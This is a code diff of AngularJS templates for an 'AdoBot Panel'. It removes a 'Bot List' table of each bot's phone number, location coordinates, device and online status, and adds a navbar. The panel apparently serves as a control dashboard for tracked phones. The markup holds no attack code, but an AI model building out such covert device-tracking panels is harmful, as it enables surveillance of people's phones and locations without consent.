@@ -1,36 +1,23 @@
-<h1>Bot List</h1>
-<table class="table">
-  <thead>
-    <tr>
-      <th>UID</th>
-      <th>Status</th>
-      <th>Last Seen</th>
-      <th>Provider</th>
-      <th>Phone#</th>
-      <th>Location</th>
-      <th>Device</th>
-      <th>SDK</th>
-      <th>Version</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr ng-repeat="bot in bots">
-      <td>
-        <a ui-sref="bot({id: bot.id})">{{bot.uid}}</a>
-      </td>
-      <td class="{{bot.status? 'text-success' : 'text-danger'}}">{{bot.status ? 'ONLINE' : 'OFFLINE'}}</td>
-      <td>{{bot.updated | amCalendar:referenceTime:formats}}</td>
-      <td>{{bot.provider}}</td>
-      <td>{{bot.phone}}</td>
-      <td>({{bot.lat}}, {{bot.longi}})</td>
-      <td>{{bot.device}}</td>
-      <td>{{bot.sdk}}</td>
-      <td>{{bot.version}}</td>
-    </tr>
-    <tr ng-show="bots.length == 0">
-      <td colspan="9">
-        <strong>No bots yet.</strong>
-      </td>
-    </tr>
-  </tbody>
-</table>
+  <nav class="navbar navbar-default navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" ui-sref="dashboard.home">AdoBot Panel</a>
+      </div>
+      <div id="navbar" class="collapse navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a ng-click="logout()">Logout</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <div class="container">
+    <ui-view></ui-view>
+  </div>
